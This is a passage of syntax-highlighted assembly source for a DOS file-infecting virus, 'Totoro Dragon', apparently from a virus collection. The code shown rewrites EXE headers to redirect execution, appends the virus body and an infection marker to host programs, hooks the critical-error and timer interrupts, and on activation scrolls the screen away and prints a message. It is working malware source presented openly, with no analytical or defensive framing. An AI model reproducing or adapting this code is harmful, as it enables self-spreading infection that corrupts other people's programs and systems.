        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SS_Save</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;Save old SS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Init_SP</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SP_Save</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">;Save old SP</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">                </span><span class="sc1">;restore ints</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Last_Page_Len</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Calculate_Exe_Header</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">EXE_Size</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Calculate_Exe_Header</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;Long, drawn out way</span><span class="sc0">
                          </span><span class="sc1">;to calculate new EXE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">EXE_Size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Last_Page_Len</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFF0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Size_Off</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Size_Seg</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Header_Size</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Init_CS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Init_SS</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Init_SP</span><span class="sc4">],</span><span class="sc2">700h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Init_IP</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXE_Entry_Point</span><span class="sc4">-</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">604h</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Last_Page_Len</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Rewrite_Header</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">Rewrite_Header</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">EXE_Size</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Move back to beginning of file</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EXE_Sig</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Write EXE header back to file</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Go to end of host.</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Write Virus</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Close_File</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Go to end of file.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Marker</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Write marker byte.</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc5">Release_Mem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Mem_Seg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Release Memory</span><span class="sc0">

</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Close file.</span><span class="sc0">

</span><span class="sc5">Reset_Attribs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">File_Name_Seg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">File_Name_Off</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">File_Attribs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Reset File attributes</span><span class="sc0">

</span><span class="sc5">Clean_Up</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CS_24</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Restore Critical Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_24</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">Int_24</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;Critical Error Handler</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">Int_08</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;Timer Click Handler</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Activation_Counter</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Activation_Counter</span><span class="sc4">],</span><span class="sc2">0CCCh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Go_Int_08</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Activation_Counter</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;Reset Counter</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Get_Mode</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Scroll_Area</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Print_Message</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc5">Go_Int_08</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                </span><span class="sc1">; Pop flags</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EA</span><span class="sc0">
</span><span class="sc5">IP_08</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">003Ch</span><span class="sc0">
</span><span class="sc5">CS_08</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0D80h</span><span class="sc0">

</span><span class="sc5">Screen_Width</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Activation_Counter</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1E0h</span><span class="sc0">

</span><span class="sc5">Get_Mode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;Get Video Mode</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0B000h</span><span class="sc0">          </span><span class="sc1">;Mode 7 Text Video Memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">In_Mode_7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0B800h</span><span class="sc0">          </span><span class="sc1">;Regular Text Video Memory</span><span class="sc0">
</span><span class="sc5">In_Mode_7</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Screen_Width</span><span class="sc4">],</span><span class="sc2">4Fh</span><span class="sc0">

</span><span class="sc5">Setup_Screen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Clear_Screen</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Scroll_Line</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0A0h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Clear_Screen</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Screen_Width</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Setup_Screen</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">Scroll_Line</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc1">;This subroutine clears the</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;screen by scrolling the text</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;straight off of the left</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">;side.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Screen_Width</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Scroll_Sideways</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Scroll_Sideways</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">Print_Message</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc4">,</span><span class="sc2">06</span><span class="sc0">    </span><span class="sc1">;lea     si,cs:[Totoro_Design]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Eh</span><span class="sc0">
</span><span class="sc5">Print_Loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;Write Char in Teletype mode</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">24h</span><span class="sc0">       </span><span class="sc1">;is it a '$'?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Print_Loop</span><span class="sc0">        </span><span class="sc1">;Nope, continue writing</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">Scroll_Area</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;Video Page 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;Get Cursor info</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">            </span><span class="sc1">;Push Cursor Location (DX)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;Scroll up (clear screen)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;Reset Cursor</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;Set Cursor for printing.</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">Totoro_Design</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' º    Totoro  Dragon    º'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' ºHello! I am TOTORO CATº'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' º Written by Y.T.J.C.T º'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' º in Ping Tung. TAIWAN º'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' º Don''t Worry,be Happy º'</span><span class="sc4">,</span><span class="sc2">0Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½$'</span><span class="sc0">
</span><span class="sc5">Marker</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'YTIT'</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">28</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;*End of virus. The bytes below this line are the infected program and the *</span><span class="sc0">
